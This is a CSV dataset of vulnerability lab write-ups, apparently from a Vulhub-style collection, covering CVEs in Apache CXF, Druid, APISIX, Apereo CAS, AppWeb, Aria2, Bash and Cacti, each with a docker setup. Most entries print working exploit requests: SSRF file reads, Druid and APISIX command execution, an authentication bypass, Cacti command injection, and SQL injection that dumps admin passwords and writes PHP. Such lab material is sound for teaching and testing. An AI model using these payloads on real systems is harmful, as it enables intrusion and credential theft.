Software,CVE,Title,Info,References
apache-cxf,CVE-2024-28752,Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752),"Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752)

中文版本 (Chinese version)

Apache CXF is an open-source services framework that helps you build and develop services using frontend programming
APIs like JAX-WS and JAX-RS.

A SSRF vulnerability using the Aegis DataBinding in versions of Apache CXF before 4.0.4, 3.6.3 and 3.5.8 allows an
attacker to perform SSRF style attacks on webservices that take at least one parameter of any type. This vulnerability
specifically impacts services utilizing the Aegis DataBinding, while services using other data bindings, including the
default, are unaffected. Attackers can exploit this vulnerability to access internal resources by making the server send
requests to arbitrary URLs, potentially leading to information disclosure or further attacks against internal systems.

References:
<https://github.com/advisories/GHSA-qmgx-j96g-4428
<https://nvd.nist.gov/vuln/detail/CVE-2024-28752
<https://github.com/ReaJason/CVE-2024-28752

Environment Environment

Execute the following command to start a vulnerable Apache CXF webservice with Aegis DataBinding:


docker compose up -d


After the service starts, the vulnerable CXF webservice will be accessible at http://your-ip:8080/test?wsdl. The
service is configured to use Aegis DataBinding and accepts various parameter types, making it vulnerable to SSRF
attacks.

Vulnerability Reproduction

Send this request to the server:


POST /test HTTP/1.1
Host: your-ip:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close
-----kkkkkk123123213
Content-Disposition: form-data; name=""1""

<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:web=""http://service.namespace/""
   <soapenv:Header/
   <soapenv:Body
      <web:test
         <arg0
<count<xop:Include xmlns:xop=""http://www.w3.org/2004/08/xop/include"" href=""file:///etc/hosts""</xop:Include</count
</arg0
      </web:test
   </soapenv:Body
</soapenv:Envelope
-----kkkkkk123123213--
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-qmgx-j96g-4428
https://nvd.nist.gov/vuln/detail/CVE-2024-28752
https://github.com/ReaJason/CVE-2024-28752"
apache-druid,CVE-2021-25646,Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646),"Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646)

中文版本(Chinese version)

Apache Druid is an open source, distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency.

Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.

References:
<https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
<https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw

Vulnerable Environment

Execute following command to start an Apache Druid server 0.20.0:


docker compose up -d


After server is started, you can see the home page of Apache Druid on http://your-ip:8888.

Exploit

Send this request to the server:


POST /druid/indexer/v1/sampler HTTP/1.1
Host: your-ip:8888
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json

{
    ""type"":""index"",
    ""spec"":{
        ""ioConfig"":{
            ""type"":""index"",
            ""firehose"":{
                ""type"":""local"",
                ""baseDir"":""/etc"",
                ""filter"":""passwd""
            }
        },
        ""dataSchema"":{
            ""dataSource"":""test"",
            ""parser"":{
                ""parseSpec"":{
                ""format"":""javascript"",
                ""timestampSpec"":{

                },
                ""dimensionsSpec"":{

                },
                ""function"":""function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\""sh\"",\""-c\"",\""id\""]).getInputStream()).useDelimiter(\""\\A\"").next();return {timestamp:123123,test: a}}"",
                """":{
                    ""enabled"":""true""
                }
                }
            }
        }
    },
    ""samplerConfig"":{
        ""numRows"":10
    }
}


You will see the output of the id command:
-------------------------------------------------------------------------------","https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw"
apereo-cas,Unknown,Apereo CAS 4.1 Deserialization RCE Vulnerability,"Apereo CAS 4.1 Deserialization RCE Vulnerability

中文版本(Chinese version)

Apereo CAS is a enterprise single sign-on system. There is an issue in CAS’s attempts to deserialize objects via the Apache Commons Collections library, which cased a RCE vulnerability.

Reference:
https://apereo.github.io/2016/04/08/commonsvulndisc/

Environment Setup

Execute following commands to start an Apereo CAS 4.1.5：


docker compose up -d


After the Apereo CAS is started, visiting http://your-ip:8080/cas/login to see the login page.

Exploit

The out-of-the-box default configuration of Apereo CAS before 4.1.7, is using a default secret key changeit:

java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(""AES"", ""CBC"", ""PKCS7""));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias(""aes128"");
        bufferedBlockCipherBean.setKeyPassword(""changeit"");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...


We can try to use Apereo-CAS-Attack to generate a encrypted ysoserial's serialized object:


java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 ""touch /tmp/success""




Then, intercept and modify the http request from login action of /cas/login, put the payload into execution's value:


POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN




Congrats, touch /tmp/success has been successfully executed:
-------------------------------------------------------------------------------","https://apereo.github.io/2016/04/08/commonsvulndisc/
http://your-ip:8080
http://your-ip:8080/cas/login"
apisix,CVE-2020-13945,Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945),"Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945)

中文版本(Chinese version)

Apache APISIX is a dynamic, real-time, high-performance API gateway. Apache APISIX has a default built-in API token edd1c9f034335f136f87ad84b625c8f1 that can be used to access all the admin API, which leads to the remote LUA code execution through the script parameter added in the 2.x version.

References:
https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187

Vulnerability Environment

Execute following command to start a Apache APISIX server 2.11.0 (this vulnerability hasn't been fixed until newest version, might be not considered fixing by vendor):


docker compose up -d


After the server is started, you can see a default 404 page at http://your-ip:9080.

Vulnerability Reproduce

Add a new evil router rule to the APISIX through admin api with default token:


POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    ""uri"": ""/attack"",
""script"": ""local M = {} \n function M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.geturiargs()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M"",
    ""upstream"": {
        ""type"": ""roundrobin"",
        ""nodes"": {
            ""example.com:80"": 1
        }
    }
}




Then, use this evil router to execute arbitrary commands:


http://your-ip:9080/attack?cmd=id
-------------------------------------------------------------------------------","https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187"
apisix,CVE-2021-45232,Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232),"Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232)

中文版本(Chinese version)

Apache APISIX is a dynamic, real-time, high-performance API gateway, and Apache APISIX Dashboard is a easy to use frontend interface that is used to manage the Apache APISIX.

In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework droplet on the basis of framework gin, all APIs and authentication middleware are developed based on framework droplet. But there are 2 of these APIs /apisix/admin/migrate/export and /apisix/admin/migrate/import directly use the interface of framework gin which are able to bypass the authentication.

By using these 2 unauthenticated API endpoints, attackers can export and import arbitrary Apache APISIX configuration including routers, services, scripts etc, that leads to reqeust unexpected URL (SSRF) or execute arbitrary LUA scripts (RCE).

References:
https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp

Vulnerable environment

Execute following command to start a vulnerable Apache APISIX Dashboard 2.9:


docker compose up -d


Then you can access http://your-ip:9000/ to see the login page for Apache APISIX Dashboard.

Exploit

/apisix/admin/migrate/export and /apisix/admin/migrate/import are 2 unauthenticated API provided by Apache APISIX Dashboard, that are used to export and import configuration for Apache APISIX. So we can simplely import a craft configuration with evil router that contains user provided LUA script:



Noted that the last 4 bytes are CRC checksum of this file, so it's better to use a automatic POC to build and send the request, for example this POC.

After adding the evil router, you should send the request to Apache APISIX (difference from Apache APISIX Dashboard) to trigger the LUA script.

The Apache APISIX is listening on port 9080 in this environment:


GET /okw1Rh HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Connection: close
CMD: id
Cache-Control: max-age=0






As you can see, the command in CMD header is executed by Apache APISIX.
-------------------------------------------------------------------------------","https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp"
appweb,CVE-2018-8715,AppWeb Authentication Bypass vulnerability (CVE-2018-8715),"AppWeb Authentication Bypass vulnerability (CVE-2018-8715)

中文版本(Chinese version)

AppWeb is an embedded Web Server based on an open source GPL agreement that was developed and maintained by Embedthis Software LLC. It is written in C/C++ and can run on almost any modern operating system. Of course, it aims to provide a Web Application container for embedded devices.

AppWeb can be configured for authentication, which includes the following three authentication methods:
basic, traditional HTTP basic authentication
digest, improved HTTP basic authentication. At this mode, the Cookie will be used to authentication instead of Authorization header.
form, HTML based form authentication

In the Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. With a forged HTTP request, it is possible to bypass authentication for the form and digest login types.

Reference link:
https://ssd-disclosure.com/index.php/archives/3676

Vulnerability environment

Launch an Appweb 7.0.1 server with digest authentication by executing the following command:


docker compose up -d


To access http://your-ip:8080, you need to enter your account password.

Exploit

The current username is admin, so you can use following request to bypass the authentication:


GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin




As you can see, since we did not pass in the password field, the server error occurred with a 200 status code and the session setting header:



The page can be accessed normally with this session header:
-------------------------------------------------------------------------------",https://ssd-disclosure.com/index.php/archives/3676
aria2,Unknown,Aria2 Arbitrary File Write Vulnerability,"Aria2 Arbitrary File Write Vulnerability

中文版本(Chinese version)

Aria2 is a lightweight, multi-protocol, multi-source download tool (supports HTTP/HTTPS, FTP, BitTorrent, Metalink) with built-in XML-RPC and JSON-RPC interfaces.

We can use the RPC interface to operate aria2 and download files to any directory, causing an arbitrary file write vulnerability.

Reference article:
https://paper.seebug.org/120/

Vulnerable Environment

Start the vulnerable environment：


docker compose up -d


6800 is the default port of aria2's rpc service. After the environment is started, access http://your-ip:6800/, and the service should return a 404 page.

Exploit

Because rpc communication requires json or xml, it is not convenient, so we can use a third-party UI to communicate with the target, such as http://binux.github.io/yaaw/demo/

Open yaaw, click the configure button and fill in the target domain name running aria2: http://your-ip:6800/jsonrpc:



Then click ""Add +"" to add a new download task. Fill in the ""Dir"" field with directory you want your file to be downloaded to and fill in the ""File Name"" field with the desired file name . For example, we will download a reverse shell by writing a crond task:



At this time, arai2 will download the malicious file (the URL you specified) to the /etc/cron.d/ directory, with the file name ""shell"". In debian, all files in the /etc/cron.d directory will be read as a scheduled task configuration file (like crontab). Once written we can must wait for upto a minute before the reverse shell script is executed:



If the reverse shell is unsuccessful, note the format of the crontab file, and the newline must be \n, and a newline is required at the end of the file.

Of course, we can also try to write other files, for more ways to exploit this vulnerability please refer to [this article][1]

[1]: https://paper.seebug.org/120/
-------------------------------------------------------------------------------","https://paper.seebug.org/120/
http://binux.github.io/yaaw/demo/
https://paper.seebug.org/120/"
bash,CVE-2014-6271,Bash Shellshock Remote Command Injection (CVE-2014-6271),"Bash Shellshock Remote Command Injection (CVE-2014-6271)

中文版本(Chinese version)

Build and run the vulnerable environment：


docker compose build
docker compose up -d


When you visit http://your-ip/ you should see two files:
safe.cgi
victim.cgi

safe.cgi generated by the latest version of bash, and victim.cgi is the page generated by bash4.3 which is vulnerable to shellshock.

We can send include our payload in the user-agent string when visiting victim.cgi and the command is executed successfully:



The same request sent to safe.cgi is unaffected:
-------------------------------------------------------------------------------",
cacti,CVE-2022-46169,Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169),"Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169)

中文版本(Chinese version)

Cacti is a robust and extensible operational monitoring and fault management framework for users around the world. A command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti prior from version 1.2.17 to 1.2.22, if a specific data source was selected for any monitored device.

References:
<https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
<https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A

Vulnerability Environment

Execute following command to start a Cacti server 1.2.22:


docker compose up -d


After the server is started, you will see the login page at http://localhost:8080.

Then login as admin/admin, follow the instructions to initialize the application. Actually, just click the ""next button"" again and again before you see the success page.



Before you can exploit this vulnerability, you have to add a new ""Graph"" because the command injection is occurred not in the default graph type:



Select the graph type ""Device - Uptime"", and click the ""Create"" button:



Exploit

After complete the above initialization, you will change your role to a attacker. Just send following request to Cacti server to trigger the command injection attack:


GET /remoteagent.php?action=polldata&localdataids[0]=6&hostid=1&poller_id=touch+/tmp/success HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost.lan
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1






Although no command result in the response, you can find the /tmp/success has been touched successfully.
-------------------------------------------------------------------------------","https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A"
cacti,CVE-2023-39361,Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459),"Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459)

中文版本(Chinese version)

Cacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality, providing network managers with an intuitive interface to network data.

In Cacti versions 1.2.24 and earlier, a critical vulnerability exists in graph_view.php that allows guest users to perform SQL injection via the 'rfilter' parameter. When guest access is enabled, attackers can potentially cause significant damage, including remote code execution.

References:
<https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
<https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv

Environment Setup

Execute the following command to start a Cacti 1.2.24 server:


docker compose up -d


After the server starts, you can access the Cacti interface at http://your-ip:8080. The default credentials are admin/admin.

Log in as admin and follow the initialization instructions. Simply click the ""Next"" button repeatedly until you see the success page.

Before exploiting the vulnerability without authentication, you must enable guest access. Log in as admin, navigate to Configuration -Authentication, and enable the guest user:



Vulnerability Reproduction

The vulnerability exists in the growrightpanetree function in graphview.php. When the 'action' parameter is set to 'treecontent', the user input ('rfilter' parameter) is validated through the htmlvalidatetreevars function, but this validation only ensures that the input is a valid regular expression and doesn't prevent SQL injection.

The SQL injection occurs because the rfilter parameter is directly inserted into a SQL query with double quotes, allowing attackers to escape the query context and inject malicious SQL code.

To exploit this vulnerability, send a request to the graph_view.php endpoint with the following parameters:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-treeanchor&rfilter=aaaaaaa""%20OR%20""""=""((""))%20UNION%20SELECT%201,2,(select%20concat(id,0x23,username,0x23,password)%20from%20userauth%20limit%201),4,5,6,(select%20user()),(select%20version()),9,10%23


The output reveals database information and admin account password:



Since Cacti supports stacked queries, you can leverage this vulnerability along with CVE-2024-31459 to achieve local file inclusion.

First, add a new plugin hook that points to the log/cacti.log file:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-treeanchor&rfilter=aaaaa""%20OR%20""""=""((""));INSERT%20INTO%20pluginhooks(name,hook,file,status)%20VALUES%20(""."",""login_before"",""../log/cacti.log"",1);%23


Then, write PHP code to the log/cacti.log file using an error-based SQL injection:


http://your-ip:8080/graphview.php?action=treecontent&node=1-1-tree_anchor&rfilter=aaaaa""%20OR%20""""=""((""))%20UNION%20SELECT%201,2,3,4,5,6,updatexml(rand(),concat(0x7e,""<?php%20phpinfo();?"",0x7e),null),8,9,10%23


Now, the PHPINFO function will execute and display when accessing the login page, confirming successful remote code execution:
-------------------------------------------------------------------------------","https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv"
